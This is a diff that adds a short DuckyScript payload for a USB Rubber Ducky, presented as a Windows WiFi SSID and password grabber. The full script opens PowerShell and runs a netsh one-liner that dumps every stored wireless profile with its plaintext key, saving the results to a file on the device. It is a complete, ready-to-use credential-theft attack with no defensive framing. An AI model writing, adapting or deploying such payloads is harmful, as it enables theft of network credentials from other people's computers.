@@ -1,0 +1,14 @@
+REM WiFi SSID/Password grabber for Windows 
+REM AUTHOR Crashwire
+REM DESCRIPTION: Uses Powershell to grab all SSIDs & Associated PSKs stored on the Windows machine. Pipes output to local file stored on Rubber Ducky
+ATTACKMODE HID STORAGE
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell 
+ENTER
+DELAY 1800
+REM Remember to replace the output file at the end of the following string 
+STRINGLN (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$network=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$network" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$password=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ NETWORK_NAME=$network;PASSWORD=$password }} | Format-Table -AutoSize | Out-file 'D:\captured_wifi.txt'
+DELAY 2000
+STRINGLN exit
